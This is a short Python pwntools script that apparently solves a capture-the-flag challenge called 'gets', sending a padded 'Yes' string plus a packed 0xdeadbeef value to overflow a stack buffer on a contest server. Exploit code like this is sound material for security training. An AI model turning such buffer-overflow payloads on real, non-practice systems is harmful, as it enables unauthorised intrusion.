from pwn import process, p64, remote
#s = process("./gets")
s = remote("gets.litctf.live", 1337)
s.recvuntil("?\n")
s.sendline(b"Yes\0".ljust(0x28) + p64(0xdeadbeef))
print(s.recvall().decode())